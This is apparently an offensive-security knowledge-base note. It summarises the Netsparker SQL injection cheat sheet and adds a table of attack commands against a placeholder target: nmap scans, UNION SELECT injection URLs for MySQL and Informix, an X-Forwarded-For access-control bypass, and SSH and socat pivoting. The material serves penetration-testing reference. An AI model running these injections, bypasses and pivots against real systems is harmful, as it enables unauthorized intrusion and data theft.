---
title: "Trained Knowledge & Topology: SQL Injection Cheat Sheet by Netsparker"
category: knowledge
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
os_platform: cross-platform
primary_tactic: Active_Enum
summary: "Operational architecture, decision workflows & Windows/Linux command reference for SQL Injection Cheat Sheet by Netsparker: Active network & port reconnaissance (nmap, Test-NetConnection), HTTP/HTTPS/REST/GraphQL/mTLS probing (curl, openssl s_client, Inv"
when_to_apply: "Apply when working with SQL Injection Cheat Sheet by Netsparker (cross-platform): Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards."
tags: [covert_infil, enumeration, http, john, mdp, pdf, trained, linux, windows, cross-platform, nmap, curl, openssl, https, api, tls, mtls, sqli, informix, mysql, mssql, oracle]
source_file: "SQL Injection Cheat Sheet by Netsparker"
updated: 2026-10-30
---

# Trained Knowledge & Architecture: `SQL Injection Cheat Sheet by Netsparker.pdf`

- **Source Path:** `~/Projects/CORA/Training/SQL Injection Cheat Sheet by Netsparker.pdf` (`pdf`)
- **Extracted Technical Entities:** `http, john`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_sql_injection_cheat_sheet_by_netsparker]] (`6` CEGAR-verified commands | `6` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `6` (full executable list in [[commands/trained_sql_injection_cheat_sheet_by_netsparker]])
- **Tactic Distribution:** `Enumeration` (5), `Covert_Infil` (1)
- **Top Extracted CLI Tools:** `mysql` (6)

## Document Structure & Key Topics
- (M)

## Extracted Operational Steps & Workflows
- 1. Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks
- 1. Line Comments
- 2. Inline Comments
- 3. Stacking Queries
- 4. If Statements
- 5. Using Integers
- 6. String Operations
- 7. Strings without Quotes
- 8. String Modification & Related
- 9. Union Injections
- 10. Bypassing Login Screens
- 11. Enabling xp_cmdshell in SQL Server 2005
- 12. Finding Database Structure in SQL Server
- 13. Fast way to extract data from Error Based SQL Injections in SQL Server
- 14. Blind SQL Injections
- 15. Covering Your Tracks
- 16. Extra MySQL Notes
- 17. Second Order SQL Injections
- 18. Out of Band (OOB) Channel Attacks
- 1. Create table foo( line varchar(8000) )
- 2. bulk insert foo from 'c:\inetpub\wwwroot\login.asp'
- 3. Drop temp table, and repeat for another file.
- 1. Cmd Execute (xp_cmdshell)
- 2. Registry Stuff (xp_regread)
- 1. xp_regaddmultistring
- 2. xp_regdeletekey
- 3. xp_regdeletevalue
- 4. xp_regenumkeys
- 5. xp_regenumvalues
- 6. xp_regread
- 7. xp_regremovemultistring
- 8. xp_regwrite
- 3. Managing Services (xp_servicecontrol)
- 4. Medias (xp_availablemedia)
- 5. ODBC Resources (xp_enumdsn)
- 6. Login mode (xp_loginconfig)
- 7. Creating Cab Files (xp_makecab)
- 8. Domain Enumeration (xp_ntsec_enumdomains)
- 9. Process Killing (need PID) (xp_terminate_process)
- 10. Add new procedure (virtually you can execute whatever you want)
- 11. Write text file to a UNC or an internal path (sp_makewebtask)
- 1. product.asp?id=4 (SMO)
- 1. product.asp?id=5-1
- 2. product.asp?id=4 OR 1=1
- 2. product.asp?name=Book

## Extracted Reference Excerpt
--- [Page 1] ---
SQL Injection Cheat Sheet
Category: Web Security Readings ­ Tags: sql injection , cheat sheet , web security ­ Tue, 29 Mar 2016, by Ferruh Mavituna
What is an SQL Injection Cheat Sheet?
An SQL injection cheat sheet is a resource in which you can find detailed technical information about
the many different variants of the SQL Injection vulnerability. This cheat sheet is of good reference to
both seasoned penetration tester and also those who are just getting started in web application
security.
About the SQL Injection Cheat Sheet
This SQL injection cheat sheet was originally published in 2007 by Ferruh Mavituna on his blog. We
have updated it and moved it over from our CEO's blog. Currently this SQL Cheat Sheet only
contains information for MySQL, Microsoft SQL Server, and some limited information for
ORACLE and PostgreSQL SQL servers. Some of the samples in this sheet might not work in every
situation because real live environments may vary depending on the usage of parenthesis, different
code bases and unexpected, strange and complex SQL sentences. 
Samples are provided to allow you to get basic idea of a potential attack and almost every section
includes a brief information about itself.
M :MySQL
S :SQL Server
P :PostgreSQL
O :Oracle
+ :Possibly all other databases
Examples;
(MS) means : MySQL and SQL Server etc.
(M*S) means : Only in some versions of MySQL or special conditions see related note and SQL
Server
Table Of Contents
1. Syntax Reference, Sample Attacks and Dirty SQL Injection Tricks
1. Line Comments
SQL Injection Attack Samples
2. Inline Comments
Classical Inline Comment SQL Injection Attack Samples
MySQL Version Detection Sample Attacks
3. Stacking Queries
Language / Database Stacked Query Support Table
About MySQL and PHP
Stacked SQL Injection Attack Samples
4. If Statements
MySQL If Statement
SQL Server If Statement
If Statement SQL Injection Attack Samples
SUBSCRIBE
Follow us
 
 
 
 
Netsparker Web Application
Security Scanner
Download Demo
Online Scan
Case Studies
Netsparker Desktop
Netsparker Cloud
Categories
Web Security Readings
Releases
Product Docs & FAQS
News
Events
Subscribe by Email
Get notified via email when new
blog posts are published.
Enter your email...
Archive
Select Month
 
 
 
 
 
 
 
Search...

--- [Page 2] ---
5. Using Integers
6. String Operations
String Concatenation
7. Strings without Quotes
Hex based SQL Injection Samples
8. String Modification & Related
9. Union Injections
UNION – Fixing Language Issues
10. Bypassing Login Screens
11. Enabling xp_cmdshell in SQL Server 2005
12. Finding Database Structure in SQL Server
13. Fast way to extract data from Error Based SQL Injections in SQL Server
14. Blind SQL Injections
15. Covering Your Tracks
16. Extra MySQL Notes
17. Second Order SQL Injection

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `SQL Injection Cheat Sheet by Netsparker`

> **Domain Hub:** [[knowledge/08_web_api_sql_injection_and_active_reconnaissance|Domain Hub 08: Active Reconnaissance (nmap), Web/API/mTLS Probing (curl / openssl), SQL Injection Cheat Sheets & Operator Playbooks]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards.  
> **15-Engine H-MDP State Transition:** `s_l2_l3_verified` $\xrightarrow{\text{Active_Enum}}$ `s_initial_shell_or_api_access` | **Bayesian Root-Cause Triggers:** `service_on_nonstandard_port_or_tls, missing_auth_or_mtls_cert, reverse_proxy_ip_acl_block, sql_injection_or_input_validation_flaw` | **Isolation:** `RED, BLUE (Allowed LAN/USB interfaces; blocked in WHITE air-gap mode except against local files/loopback)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>` | **Linux / Windows** | Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`). | Apply once L2/L3 reachability to `<TARGET_IP>` is verified (`s_l2_l3_verified -> s_active_services_enumerated`). | `powershell -NoProfile -Command "80,443,445,3389,5985,8080,8443 \| ForEach-Object { Test-NetConnection <TARGET_IP> -Port $_ }"` |
| `curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"` | **Linux / Windows** | Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`). | Apply to inspect HTTP headers (`Server`, `Last-Modified`, `ETag`, `Set-Cookie`) and login page markers. | `curl.exe -sS -k -L -i --max-time 15 "https://<TARGET_IP>/"` |
| `echo \| openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null \| openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName` | **Linux / Windows** | Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names. | Apply on HTTPS endpoints (443/8443/10443): appliances like Fortinet FortiGate expose their exact hardware model & serial (`CN = FG...`) in the TLS certificate! | `echo "" \| openssl.exe s_client -connect <TARGET_IP>:443 2>NUL \| openssl.exe x509 -noout -subject -issuer -dates` |
| `curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` | **Linux / Windows** | Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`). | Apply to determine exact appliance firmware build dates from static asset `Last-Modified` timestamps and map applicable CVEs. | `curl.exe -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` |
| `curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` | **Linux / Windows** | Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake. | Apply when an API endpoint returns `SSL alert bad certificate` or `400 No required SSL certificate was sent` (`CBR-004`). | `curl.exe -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` |
| `curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"` | **Linux / Windows** | Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses. | Apply when an endpoint behind Nginx/Apache/HAProxy returns `403 Forbidden` to external IPs (`reverse_proxy_ip_acl_block`). | `curl.exe -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" "https://<TARGET_IP>/admin"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-"` | **Linux / Windows** | Tests `UNION SELECT` SQL injection to extract DBMS version (`@@version` / `version()`), current DB user, and schema name (`[[knowledge/trained_sql_injection_cheat_sheet_by_netsparker]]`). | Apply during authorized web application security testing when an input parameter interacts with a SQL query. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,@@version,user(),database()--%20-"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/ item?id=1%20UNION%20SELECT%20FIRST%201%20tabname%20FROM%20systables--"` | **Linux / Windows** | IBM Informix SQL injection enumeration querying `systables` and `syscolumns` (`[[knowledge/trained_informix-sql-injection-cheat-sheet]]`). | Apply when target database errors or banners indicate IBM Informix Dynamic Server. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item?id=1%20UNION%20SELECT%20DBINFO('version','full')%20FROM%20systables%20WHERE%20tabid=1--"` |
| `ssh -o StrictHostKeyChecking=no -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` | **Linux / Windows** | Establishes a local SSH port forward (`-L`) mapping local `127.0.0.1:8443` to `<TARGET_IP>`'s internal loopback `127.0.0.1:8080` (`[[knowledge/trained_penetration_testing_tools_cheat_sheet]]`). | Apply when `ss -tulpn` / `netstat -ano` shows an internal service bound exclusively to `127.0.0.1:8080` on `<TARGET_IP>`. | `ssh.exe -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` |
| `socat TCP-LISTEN:8443,fork,reuseaddr TCP:<SECONDARY_IP>:443` | **Linux Bash** | Creates a bidirectional userland TCP relay forwarding connections on port `8443` to downstream `<SECONDARY_IP>:443`. | Apply on a pivot host when kernel `ip_forward` or `iptables` NAT cannot be modified (e.g., inside an unprivileged container). | `netsh interface portproxy add v4tov4 listenport=8443 connectaddress=<SECONDARY_IP> connectport=443` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux / Windows] Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`).
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# [Linux / Windows] Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`).
curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"
# [Linux / Windows] Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names.
echo | openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName
# [Linux / Windows] Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`).
curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"
# [Linux / Windows] Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake.
curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"
# [Linux / Windows] Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses.
curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
